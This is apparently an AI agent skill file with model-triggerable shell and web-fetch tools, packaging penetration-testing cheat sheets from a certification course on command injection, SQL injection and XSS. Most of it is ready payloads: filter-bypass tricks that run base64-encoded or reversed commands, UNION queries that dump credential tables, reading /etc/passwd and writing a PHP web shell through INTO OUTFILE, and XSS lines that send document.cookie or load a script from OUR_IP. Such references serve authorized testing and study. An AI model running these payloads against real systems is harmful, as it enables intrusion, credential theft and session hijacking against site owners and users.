---
name: cpts-injection-attacks
description: "CPTS Injection-Based Attacks: command injection, SQL injection (error-based, union-based, blind, OOB), and XSS (reflected, stored, DOM). Includes detection, exploitation, bypass techniques, and sqlmap usage. Use when testing for injection vulnerabilities in web applications."
argument-hint: "[target] [injection-type]"
allowed-tools:
  - read
  - grep
  - glob
  - exec
  - webfetch
triggers:
  - user
  - model
---

> ⚠️ **AUTHORIZED USE ONLY** ⚠️
>
> This skill is provided for educational purposes and authorized penetration testing ONLY.
> Only use these techniques against systems you own or have explicit written permission to test.
> Unauthorized access to computer systems is illegal. You are responsible for your own actions.

# CPTS Injection-Based Attacks

## Purpose

This skill provides comprehensive reference material for identifying, exploiting, and bypassing injection-based vulnerabilities in web applications. It covers three core injection categories from the HTB CPTS curriculum:

1. **Command Injections** — OS command injection with filter/character bypass techniques for Linux and Windows.
2. **SQL Injection** — Auth bypass, UNION-based enumeration, privilege escalation, and file read/write via MySQL.
3. **Cross-Site Scripting (XSS)** — Reflected/stored/DOM payloads, DOM manipulation, cookie theft, and tooling.

---

## 1. Command Injections

Command injection occurs when user-supplied input is interpreted as part of an operating system command, allowing an attacker to execute arbitrary commands on the host.

### Injection Operators

These operators allow chaining additional commands onto the original (legitimate) command. Each has a URL-encoded form useful for HTTP parameter injection.

#### Semicolon
```bash
;  # %3b - Both systems
```

#### New Line
```bash
\n  # %0a - Both systems
```

#### Background
```bash
&  # %26 - Both systems (second output generally shown first)
```

#### Pipe
```bash
|  # %7c - Both systems (only second output is shown)
```

#### AND Operator
```bash
&&  # %26%26 - Both systems (only if first command succeeds)
```

#### OR Operator
```bash
||  # %7c%7c - Executes second command if first fails
```

#### Sub-Shell (Linux Only)
```bash
``  # %60%60 - Linux-only
$()  # %24%28%29 - Linux-only
```

### Linux - Filtered Character Bypass

#### View Environment Variables
```bash
printenv  # Displays all environment variables
```

#### Space Bypass
```bash
%09  # Use tabs instead of spaces
${IFS}  # Replaced with space or tab (Not usable in sub-shells)
{ls,-la}  # Commas replaced with spaces
```

#### Other Character Bypass
```bash
${PATH:0:1}  # Replaced with /
${LS_COLORS:10:1}  # Replaced with ;
$(tr '!-}' '"-~'<<<[)  # Shift character by one ([ -> \)
```

#### Blacklisted Command Bypass

##### Character Insertion
```bash
' or "  # Total must be even
$@ or \  # Linux only
```

##### Case Manipulation
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  # Executes regardless of case
$(a="WhOaMi";printf %s "${a,,}")  # Another case manipulation method
```

##### Reversed Commands
```bash
echo 'whoami' | rev  # Reverse a string
$(rev<<<'imaohw')  # Execute reversed command
```

##### Encoded Commands
```bash
echo -n 'cat /etc/passwd | grep 33' | base64  # Encode with base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  # Execute base64 encoded string
```

### Windows - Filtered Character Bypass

#### View Environment Variables (PowerShell)
```powershell
Get-ChildItem Env:  # View all environment variables
```

#### Space Bypass
```powershell
%09  # Use tabs instead of spaces
%PROGRAMFILES:~10,-5%  # Replaced with space (CMD)
$env:PROGRAMFILES[10]  # Replaced with space (PowerShell)
```

#### Other Character Bypass
```powershell
%HOMEPATH:~0,-17%  # Replaced with \ (CMD)
$env:HOMEPATH[0]  # Replaced with \ (PowerShell)
```

#### Blacklisted Command Bypass

##### Character Insertion
```powershell
' or "  # Total must be even
^  # Windows only (CMD)
```

##### Case Manipulation
```powershell
WhoAmi  # Odd case characters to bypass filters
```

##### Reversed Commands
```powershell
"whoami"[-1..-20] -join ''  # Reverse a string in PowerShell
iex "$('imaohw'[-1..-20] -join '')"  # Execute reversed command in PowerShell
```

##### Encoded Commands
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))  # Encode with base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"  # Execute base64 encoded string
```

---

## 2. SQL Injection

SQL injection (SQLi) allows an attacker to manipulate the structure and logic of SQL queries executed by the backend database. The notes below focus on MySQL.

### MySQL Command Reference

#### General
```sql
mysql -u root -h docker.hackthebox.eu -P 3306 -p  -- Login to MySQL database.
SHOW DATABASES;  -- List available databases.
USE users;  -- Switch to a database.
```

#### Tables
```sql
CREATE TABLE logins (id INT, ...);  -- Add a new table.
SHOW TABLES;  -- List available tables in the current database.
DESCRIBE logins;  -- Show table properties and columns.
INSERT INTO table_name VALUES (value_1,..);  -- Add values to a table.
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);  -- Add values to specific columns in a table.
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;  -- Update table values.
```

#### Columns
```sql
SELECT * FROM table_name;  -- Show all columns in a table.
SELECT column1, column2 FROM table_name;  -- Show specific columns in a table.
DROP TABLE logins;  -- Delete a table.
ALTER TABLE logins ADD newColumn INT;  -- Add new column.
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;  -- Rename a column.
ALTER TABLE logins MODIFY oldColumn DATE;  -- Change column datatype.
ALTER TABLE logins DROP oldColumn;  -- Delete a column.
```

#### Output
```sql
SELECT * FROM logins ORDER BY column_1;  -- Sort by column.
SELECT * FROM logins ORDER BY column_1 DESC;  -- Sort by column in descending order.
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;  -- Sort by two columns.
SELECT * FROM logins LIMIT 2;  -- Only show the first two results.
SELECT * FROM logins LIMIT 1, 2;  -- Show two results starting from index 2.
SELECT * FROM table_name WHERE <condition>;  -- List results that meet a condition.
SELECT * FROM logins WHERE username LIKE 'admin%';  -- List results where the name is similar to a given string.
```

### MySQL Operator Precedence

1. Division (`/`), Multiplication (`*`), and Modulus (`%`)
2. Addition (`+`) and Subtraction (`-`)
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. NOT (`!`)
5. AND (`&&`)
6. OR (`||`)

### SQL Injection Techniques

#### Auth Bypass
```sql
admin' or '1'='1  -- Basic Auth Bypass.
admin')-- -  -- Basic Auth Bypass with comments.
```

#### Auth Bypass Payloads
- Use variations based on the application's response to refine bypass strategies.

#### Union Injection
```sql
' order by 1-- -  -- Detect number of columns using ORDER BY.
cn' UNION select 1,2,3-- -  -- Detect number of columns using UNION.
cn' UNION select 1,@@version,3,4-- -  -- Basic Union injection.
UNION select username, 2, 3, 4 from passwords-- -  -- Union injection for 4 columns.
```

#### DB Enumeration
```sql
SELECT @@version;  -- Fingerprint MySQL with query output.
SELECT SLEEP(5);  -- Fingerprint MySQL with no output.
cn' UNION select 1,database(),2,3-- -  -- Current database name.
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  -- List all databases.
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  -- List all tables in a specific database.
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  -- List all columns in a specific table.
cn' UNION select 1, username, password, 4 from dev.credentials-- -  -- Dump data from a table in another database.
```

#### Privileges
```sql
cn' UNION SELECT 1, user(), 3, 4-- -  -- Find current user.
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -  -- Check if user has admin privileges.
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -  -- Find all user privileges.
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  -- Find accessible directories via MySQL.
```

#### File Injection
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -  -- Read a local file.
select 'file written successfully!' into outfile '/var/www/html/proof.txt';  -- Write a string to a local file.
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -  -- Upload a PHP web shell.
```

---

## 3. Cross-Site Scripting (XSS)

XSS allows an attacker to inject client-side scripts into web pages viewed by other users. Payloads below cover alert/proof, DOM manipulation, and exfiltration scenarios.

### Basic Payloads

#### Basic alert XSS
```html
<script>alert(window.origin)</script>
```

#### Plaintext injection
```html
<plaintext>
```

#### Basic print execution
```html
<script>print()</script>
```

#### HTML-based alert XSS
```html
<img src="" onerror=alert(window.origin)>
```

### DOM Manipulation

#### Change background color
```html
<script>document.body.style.background = "#141d2b"</script>
```

#### Change background image
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

#### Change website title
```html
<script>document.title = 'HackTheBox Academy'</script>
```

#### Overwrite website's main body
```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```

#### Remove specific HTML element
```html
<script>document.getElementById('urlform').remove();</script>
```

### Advanced Payloads

#### Load remote script
```html
<script src="http://OUR_IP/script.js"></script>
```

#### Send cookie data to attacker
```html
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```

### Common Commands

#### Scanning and Exploitation

##### Run xsstrike on a URL parameter
```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

#### Networking

##### Start netcat listener
```bash
sudo nc -lvnp 80
```

##### Start PHP server
```bash
sudo php -S 0.0.0.0:80
```
